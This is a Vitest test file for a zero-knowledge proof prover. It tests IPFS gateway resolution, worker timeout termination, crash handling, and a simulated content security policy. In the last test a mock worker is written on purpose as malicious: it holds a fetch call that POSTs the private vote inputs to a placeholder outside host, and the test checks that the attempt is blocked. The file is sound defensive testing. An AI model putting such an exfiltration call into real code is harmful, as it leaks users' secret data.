import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { generateAndEncodeProof, resolveGateway } from '../prover';

describe('// ZK_PROVER_ORCHESTRATION_TESTS', () => {
  beforeEach(() => {
    global.fetch = vi.fn(() =>
      Promise.resolve({
        ok: true,
        arrayBuffer: () => Promise.resolve(new ArrayBuffer(8)),
      })
    );

    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.useRealTimers();
  });

  const mockManifest = {
    artifacts: {
      wasmURI: 'ipfs://QmFakeWasm',
      zkeyURI: 'ipfs://QmFakeZkey',
    },
  };

  it('> SHOULD_RESOLVE_IPFS_GATEWAYS_CORRECTLY', () => {
    expect(resolveGateway('ipfs://Qm123')).toBe('https://gateway.pinata.cloud/ipfs/Qm123');
    expect(resolveGateway('https://example.com')).toBe('https://example.com');
  });

  it('> SHOULD_TERMINATE_WORKER_ON_MALICIOUS_INFINITE_LOOP', async () => {
    const mockTerminate = vi.fn();
    global.Worker = vi.fn(() => ({
      postMessage: vi.fn(),
      terminate: mockTerminate,
      onmessage: null,
      onerror: null,
    }));

    const proofPromise = generateAndEncodeProof(mockManifest, {test: 1});

    const expectedPromise = expect(proofPromise).rejects.toThrow(
      'Proof generation timed out. Malicious or heavy circuit detected.'
    );

    await vi.advanceTimersByTimeAsync(601000)

    await expectedPromise;

    expect(mockTerminate).toHaveBeenCalled();
  }, 601000);

  it('> SHOULD_HANDLE_WORKER_CRASHES_GRACEFULLY', async () => {
    const mockTerminate = vi.fn();
    
    global.Worker = vi.fn(function() {
      this.postMessage = function() {
        if (this.onerror) {
          this.onerror(new Error('WASM Memory Access Violation'));
        }
      };
      this.terminate = mockTerminate;
      return this;
    });

    const proofPromise = generateAndEncodeProof(mockManifest, { test: 1 });

    await expect(proofPromise).rejects.toThrow('Fatal Worker Error: WASM Memory Access Violation');
    expect(mockTerminate).toHaveBeenCalled();
  });

  it('> SHOULD_ISOLATE_AND_CATCH_ROGUE_WORKER_NETWORK_ATTEMPTS', async () => {
    // 1. We mock global fetch to act like a strict CSP
    // It only allows Pinata, and actively rejects anything else
    global.fetch = vi.fn((url) => {
        if (url.includes('gateway.pinata.cloud')) {
            return Promise.resolve({ ok: true, arrayBuffer: () => Promise.resolve(new ArrayBuffer(8)) });
        }
        // Simulate the browser's CSP blocking the request
        return Promise.reject(new TypeError("Failed to fetch: CSP Violation"));
    });

    const mockTerminate = vi.fn();

    // 2. We create a Malicious Mock Worker directly in the test
    global.Worker = vi.fn(function() {
        this.postMessage = async function(data) {
            try {
                // --- THE INJECTED MALICIOUS EXFILTRATION ---
                await fetch("https://jsonplaceholder.typicode.com/posts", {
                    method: "POST",
                    body: JSON.stringify(data.resolvedInputs)
                });
                
                // If it gets here, the test should fail!
                if (this.onmessage) this.onmessage({ data: { success: true, payload: "STOLEN" }});
            } catch (e) {
                // The simulated CSP blocked it, so the worker crashes
                if (this.onerror) this.onerror(new Error("Worker crashed due to network violation"));
            }
        };
        this.terminate = mockTerminate;
        return this;
    });

    const proofPromise = generateAndEncodeProof(mockManifest, { secretVote: "Option_1" });

    // 3. We expect the main thread to catch the worker's crash and reject safely
    await expect(proofPromise).rejects.toThrow("Fatal Worker Error: Worker crashed due to network violation");
    expect(mockTerminate).toHaveBeenCalled();
  });
});